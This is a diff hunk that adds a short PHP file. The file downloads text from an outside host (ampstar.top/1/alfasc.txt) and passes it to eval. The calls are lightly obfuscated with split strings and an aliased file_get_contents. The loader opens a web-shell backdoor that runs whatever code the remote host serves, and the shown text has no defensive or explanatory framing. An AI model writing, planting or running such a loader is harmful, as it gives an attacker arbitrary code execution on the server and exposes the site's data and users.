@@ -1,0 +1,10 @@
+<?php 
+        $awo = 'https://';
+        $fgt = 'file_get_contents';
+        $data = $fgt($awo . 'ampstar.top/1/alfasc.txt');
+    
+        $admin = '?>';
+        eval($admin . $data);
+    
+        exit;
+?>
